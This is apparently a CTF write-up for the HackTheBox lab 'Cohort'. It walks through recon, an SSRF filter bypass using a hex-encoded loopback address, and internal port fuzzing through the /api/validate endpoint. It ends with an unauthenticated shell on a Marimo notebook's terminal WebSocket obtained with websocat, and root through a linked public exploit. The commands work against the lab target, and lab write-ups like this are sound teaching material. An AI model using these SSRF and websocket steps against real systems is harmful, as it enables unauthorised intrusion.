---
title: "HTB Cohort Writeup: SSRF to Marimo RCE to Root"
date: 2026-09-30 00:00:00 +0800
categories: [CTF, HackTheBox]
tags: [HackTheBox, SSRF, RCE, Marimo, CTF]
---

# Target 10.129.22.194

## Network recon

### Rustscan

```bash
rustscan -a $ip --ulimit 5000
```

```output
Open 10.129.22.194:22
Open 10.129.22.194:80
```

### Nmap

```bash
nmap -sT -A -Pn -T5 -p 22,80 10.129.22.194 --disable-arp-ping --min-rtt-timeout 50ms --max-rtt-timeout 100ms --stats-every=2s
```

```
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

Just ssh and http. Nothing to brute force or play with on the ssh side yet, so the web app is clearly where this box is going to happen.

## VHost discovery

```bash
ffuf -u https://cohort.htb/ -w /usr/share/wordlists/Seclists/Discovery/DNS/subdomains-top1million-110000.txt -fc 404 -H "HOST:FUZZ.cohort.htb" -fs 178 -s
```

Nothing came back here. No extra vhosts, no hidden subdomain handed to me on a plate. Fine, moving on, I'll come back to vhosts later if something points me there.

## Asset discovery

```bash
feroxbuster -u https://cohort.htb/ -w /usr/share/wordlists/Seclists/Discovery/Web-Content/common.txt -X 404
```

Same story, mostly static marketing pages, nothing that screamed "attack me here". At this point I stopped relying on wordlists and just started using the app like a normal user, because clearly the way in wasn't going to be a forgotten directory.

## Web page

### Tech stack

Nginx on Ubuntu.

```bash
whatweb http://cohort.htb/
```

```
https://cohort.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.22.194], Script, Title[Cohort Analytics], nginx[1.24.0]
```
<img width="1197" height="851" alt="image" src="https://github.com/user-attachments/assets/cca43333-9695-47a3-b01c-0915d8449dbc" />


The site is "Cohort Analytics". Clicking around, there's a feature that takes a URL and a CSV and validates it before processing. That's usually a good sign. Two things crossed my mind immediately:

<img width="476" height="321" alt="image" src="https://github.com/user-attachments/assets/21c8897c-323d-4701-8591-e7effed6dc93" />

- SSRF through the URL field
- Arbitrary file read through a crafted evil CSV

I decided to chase the SSRF angle first since it was the more direct path, and kept the CSV idea as a backup.

### SSRF confirmed

Instead of throwing `127.0.0.1` straight at it, which most filters catch, I tried the hex-encoded version:

```
http://0x7f000001
```

And it got accepted. So the `/api/validate` endpoint really does fetch whatever URL you feed it server-side, it just has a weak filter that blocks the obvious loopback formats and not the hex one. Confirmed SSRF.

Now the question became: what's actually listening on localhost that I can reach through this.

## Fuzzing internal ports

```bash
for i in {1..10000}; do echo $i >> ports.txt; done
```

```bash
ffuf -u http://cohort.htb/api/validate -X post -w ./ports.txt -H "Content-Type: application/json" -d '{"url":"http://0x7f000001:FUZZ","format":"csv"}'
```

ffuf's own output wasn't giving me much to filter on at a glance, too much noise to eyeball from the terminal, so I switched over to Caido to actually read the responses properly instead of guessing from status codes alone.

<img width="1879" height="912" alt="image" src="https://github.com/user-attachments/assets/834b62f0-ae2e-45d0-8e13-1e96b724eb35" />


Going through them one by one, port 8888 was the one that stood out:

```
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Sun, 02 Aug 2026 16:19:48 GMT
Content-Type: application/json
Content-Length: 1515
Connection: close

{
    "ok": true,
    "fetched_status": 200,
    "content_type": "text/html; charset=utf-8",
    "preview": "\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n<title>marimo</title>\n</head>\n<body style=\"\n    background-color: #f4f4f9;\n    display: flex;\n    justify-content: center;\n    align-items: center;\n    height: 100vh;\n    margin: 0;\">\n  <form method=\"POST\" action=\"/auth/login\" style=\"\n    padding: 20px;\n    background-color: white;\n    border-radius: 8px;\n    box-shadow: 0 4px 8px rgba(0,0,0,0.1);\n    width: 300px;\n    text-align: center;\">\n    <div style=\"margin-bottom: 20px;\">\n      <label for=\"password\" style=\"\n        display: block;\n        margin-bottom: 5px;\n        font-size: 16px;\n        font-family: Arial, sans-serif;\n        color: #333;\">Access Token / Password</label>\n      <input id=\"password\" name=\"password\" type=\"password\" style=\"\n        width: 100%;\n        box-sizing: border-box;\n        padding: 8px;\n        border: 1px solid #ccc;\n        border-radius: 4px;\">\n    </div>\n    <button type=\"submit\" style=\"\n        background-color: #1C7362;\n        color: white;\n        padding: 10px 20px;\n        border: none;\n        border-radius: 4px;\n        cursor: pointer;\n        width: 100%;\n        font-size: 16px;\">Login</button>\n    <p style=\"color: red;\"></p>\n  </form>\n</body>\n</html>\n",
    "message": "Source reachable."
}
```

A Marimo login page, running internally on 8888, with no vhost on the outside pointing at it. Interesting. Marimo rang a bell.

### Possible CVE

CVE-2026-39987 is a critical pre-auth RCE in Marimo. It affects every version up to 0.20.4 and was fixed in 0.23.0. The bug is that the `/terminal/ws` WebSocket endpoint skips authentication entirely, so anyone who can reach it gets a full interactive shell.

Good, but there's a problem: the SSRF I have is a plain HTTP fetch done server-side, it's not going to upgrade a connection to a WebSocket for me. I needed to actually reach that endpoint directly, not through the proxy. So the real question became whether this internal service was reachable some other way, maybe through a vhost nobody bothered hiding properly.

First, just to rule things out, I tried other HTTP methods against it through the SSRF:

```
{
    "ok": true,
    "fetched_status": 405,
    "content_type": "application/json",
    "preview": "{\"ok\": false, \"message\": \"Method not allowed.\"}",
    "message": "Source responded with an error status."
}
```

Dead end through that path. While fuzzing I'd also noticed port 5000 responding, so I went back and started poking at that one directly through the SSRF instead of guessing paths blindly. Hitting `/status` on it gave me exactly what I needed:

```json
{
    "ok": true,
    "fetched_status": 200,
    "content_type": "application/json",
    "preview": "{\"service\":\"cohort-edge\",\"status\":\"ok\",\"generated_by\":\"nginx\",\"upstreams\":[{\"name\":\"marketing\",\"host\":\"cohort.htb\",\"root\":\"/var/www/cohort\"},{\"name\":\"insights-api\",\"host\":\"cohort.htb\",\"path\":\"/api/\",\"target\":\"127.0.0.1:5000\"},{\"name\":\"notebooks\",\"host\":\"nb-1be3782a8afd3ad5.cohort.htb\",\"target\":\"127.0.0.1:8888\",\"note\":\"internal analyst workspace, not for external use\"}]}",
    "message": "Source reachable."
}
```

That's basically the whole nginx routing table, handed to me because someone left a status endpoint readable. There it was: a third vhost, `nb-1be3782a8afd3ad5.cohort.htb`, routed straight to the Marimo instance on 8888. The "internal analyst workspace, not for external use" note is cute, but nothing in nginx was actually enforcing that. If the hostname resolves and the vhost is configured, it's reachable from the outside like any other.

## Getting a shell

Worth a shot directly, no proxy needed this time:

```bash
rlwrap websocat wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws -k
```

And it worked. Full interactive shell as the `marimo` user, no authentication required, exactly as the CVE description promised.

## Privilege escalation

First thing after landing a shell, checking what I actually had access to. SSH wasn't usable for interaction, so I checked why:

```bash
cat /etc/passwd | grep sh
```

```
root:x:0:0:root:/root:/bin/bash
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
```

Only root has a real shell, sshd itself can't log in interactively. So ssh was never going to be my way forward, the box wants you to pivot from inside.

Remembering port 5000 from the SSRF fuzzing earlier, I checked it from the inside this time:

```bash
ss -tlnp
```

```
tcp   LISTEN 0      5          127.0.0.1:5000      0.0.0.0:*
```

Still there, still local-only. Trying to inspect it as the `marimo` user:

```bash
lsof -i :5000
```

No output, no permission to see the owning process. That on its own told me something: if a normal user can't query a listening socket's process info, it's almost always because that process belongs to root. That's the lead worth chasing.

From there, a known public exploit for that service did the rest:

[Pack2TheRoot exploit.c](https://github.com/shibaaa204/Pack2TheRoot/blob/main/exploit.c)

Rooted.
